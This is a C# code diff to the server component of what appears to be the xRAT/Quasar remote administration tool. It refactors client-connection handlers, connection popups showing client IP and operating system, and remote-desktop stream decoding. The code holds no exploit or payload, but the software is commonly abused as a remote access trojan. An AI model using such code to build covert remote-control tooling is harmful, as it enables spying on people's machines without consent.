@@ -13,13 +13,14 @@ namespace xServer.Core.Commands
 	public static class CommandHandler
 	{
 		private const string DELIMITER = "$E$";
+		private static int lastQuality = -1;
 
-		public static void HandleInitialize(Client client, Initialize packet, FrmMain mainForm)
+		public static void HandleInitialize(Client client, Initialize packet)
 		{
 			if (client.EndPoint.Address.ToString() == "255.255.255.255")
 				return;
 
-			mainForm.Invoke((MethodInvoker)delegate
+			FrmMain.Instance.Invoke((MethodInvoker)delegate
 			{
 				try
 				{
@@ -32,11 +33,11 @@ namespace xServer.Core.Commands
 					client.Value.City = packet.City;
 					client.Value.Id = packet.Id;
 
-					if (!mainForm.ListenServer.AllTimeConnectedClients.ContainsKey(client.Value.Id))
-						mainForm.ListenServer.AllTimeConnectedClients.Add(client.Value.Id, DateTime.Now);
+					if (!FrmMain.Instance.ListenServer.AllTimeConnectedClients.ContainsKey(client.Value.Id))
+						FrmMain.Instance.ListenServer.AllTimeConnectedClients.Add(client.Value.Id, DateTime.Now);
 
-					mainForm.ListenServer.ConnectedClients++;
-					mainForm.UpdateWindowTitle(mainForm.ListenServer.ConnectedClients, mainForm.lstClients.SelectedItems.Count);
+					FrmMain.Instance.ListenServer.ConnectedClients++;
+					FrmMain.Instance.UpdateWindowTitle(FrmMain.Instance.ListenServer.ConnectedClients, FrmMain.Instance.lstClients.SelectedItems.Count);
 
 					string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);
 
@@ -49,10 +50,10 @@ namespace xServer.Core.Commands
 						}) { Tag = client, ImageIndex = packet.ImageIndex };
 
 
-					mainForm.lstClients.Items.Add(lvi);
+					FrmMain.Instance.lstClients.Items.Add(lvi);
 
 					if (XMLSettings.ShowPopup)
-						ShowPopup(client, mainForm);
+						ShowPopup(client);
 
 					client.Value.IsAuthenticated = true;
 				}
@@ -61,21 +62,21 @@ namespace xServer.Core.Commands
 			});
 		}
 
-		private static void ShowPopup(Client c, FrmMain mainForm)
+		private static void ShowPopup(Client c)
 		{
-			mainForm.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country), string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(), c.Value.OperatingSystem), ToolTipIcon.Info);
+			FrmMain.Instance.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country), string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(), c.Value.OperatingSystem), ToolTipIcon.Info);
 		}
 
-		public static void HandleStatus(Client client, Status packet, FrmMain mainForm)
+		public static void HandleStatus(Client client, Status packet)
 		{
 			new Thread(() =>
 			{
-				foreach (ListViewItem lvi in mainForm.lstClients.Items)
+				foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
 				{
 					Client c = (Client)lvi.Tag;
 					if (client == c)
 					{
-						mainForm.Invoke((MethodInvoker)delegate
+						FrmMain.Instance.Invoke((MethodInvoker)delegate
 						{
 							lvi.SubItems[3].Text = packet.Message;
 						});
@@ -86,16 +87,16 @@ namespace xServer.Core.Commands
 			}).Start();
 		}
 
-		public static void HandleUserStatus(Client client, UserStatus packet, FrmMain mainForm)
+		public static void HandleUserStatus(Client client, UserStatus packet)
 		{
 			new Thread(() =>
 			{
-				foreach (ListViewItem lvi in mainForm.lstClients.Items)
+				foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
 				{
 					Client c = (Client)lvi.Tag;
 					if (client == c)
 					{
-						mainForm.Invoke((MethodInvoker)delegate
+						FrmMain.Instance.Invoke((MethodInvoker)delegate
 						{
 							lvi.SubItems[4].Text = packet.Message;
 						});
@@ -114,7 +115,9 @@ namespace xServer.Core.Commands
 			// we can not dispose all bitmaps here, cause they are later used again in `client.Value.LastDesktop`
 			if (client.Value.LastDesktop == null)
 			{
-				client.Value.StreamCodec = new Helper.UnsafeStreamCodec(0);
+				client.Value.StreamCodec = new Helper.UnsafeStreamCodec();
+				if (lastQuality < 0)
+					lastQuality = packet.Quality;
 
 				using (MemoryStream ms = new MemoryStream(packet.Image))
 				{
@@ -132,15 +135,24 @@ namespace xServer.Core.Commands
 			{
 				using (MemoryStream ms = new MemoryStream(packet.Image))
 				{
-					Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);
-
-					client.Value.LastDesktop = newScreen;
-					client.Value.FrmRdp.Invoke((MethodInvoker) delegate
+					lock (client.Value.StreamCodec)
 					{
-						client.Value.FrmRdp.picDesktop.Image = (Bitmap)newScreen.Clone();
-					});
+						if (lastQuality != packet.Quality)
+						{
+							client.Value.StreamCodec = new Helper.UnsafeStreamCodec();
+							lastQuality = packet.Quality;
+						}
 
-					newScreen = null;
+						Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);
+
+						client.Value.LastDesktop = newScreen;
+						client.Value.FrmRdp.Invoke((MethodInvoker) delegate
+						{
+							client.Value.FrmRdp.picDesktop.Image = (Bitmap) newScreen.Clone();
+						});
+
+						newScreen = null;
+					}
 				}
 			}
 
